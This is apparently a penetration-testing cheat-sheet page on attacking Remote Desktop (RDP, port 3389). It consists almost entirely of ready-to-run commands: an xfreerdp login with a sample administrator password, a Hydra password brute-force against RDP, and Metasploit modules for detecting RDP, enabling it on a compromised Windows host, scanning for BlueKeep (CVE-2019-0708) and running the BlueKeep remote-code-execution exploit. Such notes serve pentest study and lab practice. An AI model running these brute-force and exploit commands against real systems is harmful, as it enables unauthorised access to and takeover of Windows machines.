---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 3389 - RDP

## XfreeRDP

```bash
# Connect with AUTHENTICATION
xfreerdp /u:Administrator /p:password123 /v:$IP:$PORT
```

## Hydra

```bash
hydra -l "Administrator" -P /wordlists/passwords.txt rdp://$IP -s $PORT
```

## MSFconsole

```bash
# Checking RDP present, none default `port:3389`
auxiliary/scanner/rdp/rdp_scanner

# Enabling RDP
post/windows/manage/enable_rdp

# Scan OS, if it's vulnerable to bluekeep
auxiliary/scanner/cve_2019_0708_bluekeep

# Exploit the bluekeep (64 bit)
exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```
